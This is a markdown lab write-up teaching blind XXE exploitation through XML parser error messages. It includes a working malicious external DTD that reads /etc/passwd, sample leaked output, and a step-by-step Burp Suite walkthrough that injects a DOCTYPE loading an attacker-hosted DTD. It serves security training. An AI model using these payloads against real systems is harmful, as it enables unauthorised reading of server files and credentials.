# Exploiting XXE to Extract Files, Perform SSRF, and Handle Blind XXE ðŸš¨

XXE (XML External Entity) is a vulnerability that allows attackers to extract files from a server, perform SSRF attacks, and exploit "blind" XXE vulnerabilities. This guide covers all these scenarios with detailed examples. ðŸ’¡

---

## Using Blind XXE to Extract Data via Error Messages

An alternative approach to exploiting blind XXE is triggering an XML parsing error where the error message contains sensitive data you want to retrieve. This is effective if the application returns the resulting error message in its response.

### Example of a Malicious DTD

You can cause an XML parsing error containing the contents of the `/etc/passwd` file using the following malicious external DTD:
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```

This DTD performs the following steps:

1. Defines a parameter entity `file` containing the contents of the `/etc/passwd` file.
2. Defines an entity `eval` that declares another dynamic parameter entity `error`. The `error` entity attempts to load a nonexistent file whose name includes the value of the `file` entity.
3. Uses the `eval` entity to declare the `error` entity.
4. Invokes the `error` entity, causing an attempt to load a nonexistent file, which results in an error message containing the filename â€” effectively leaking the `/etc/passwd` contents.

Triggering this malicious external DTD will produce an error message like the following:
```
java.io.FileNotFoundException: /nonexistent/root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
...
```

---

## Example Lab Exercise

In this lab, the "Check Stock" function processes XML input data but does not display the result.

To solve the lab, use an external DTD to trigger an error message displaying the contents of the `/etc/passwd` file.

The lab provides a link to an exploit server on another domain where you can host your malicious DTD.

### Steps to Execute

### 1. Select a Product
Open the product list and choose any item:

![Product List](https://github.com/user-attachments/assets/420f18e2-6900-4413-81f2-7cc5c6103444)

---

### 2. Click the Button
On the product page, click the **"Check Stock"** button after enabling a proxy tool (e.g., Burp Suite):

![Check Stock Button](https://github.com/user-attachments/assets/c12710e3-0520-47a9-b507-1bb41849a7df)

---

### 3. Prepare the Malicious DTD
Upload the following payload to the exploit server:
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```

![Preparing the Malicious DTD](https://github.com/user-attachments/assets/11ff29f8-5837-4372-900b-a9d5bbddcdd9)

---

### 4. Intercept the Request
Navigate to **Proxy â†’ HTTP History**, select the POST request to `/product/stock`, and send it to **Repeater**:

![POST Request](https://github.com/user-attachments/assets/1a3d72b0-4f86-4a0f-8a3f-d488517695b2)

---

### 5. Insert the Payload
Add the following external entity definition between the XML declaration and the `stockCheck` element:
```xml
<!DOCTYPE foo [<!ENTITY % eyes SYSTEM "YOUR-DTD-URL"> %eyes;]>
```

![Inserting the Payload](https://github.com/user-attachments/assets/0e7f5ee1-ca87-4bf9-ac69-5d11b894fba8)

---

### 6. Retrieve the Output
The `/etc/passwd` contents should now appear in the application's error message:

![Output of /etc/passwd](https://github.com/user-attachments/assets/70fb7b7c-fa39-4c23-be4d-b5d2e10d6c9f)

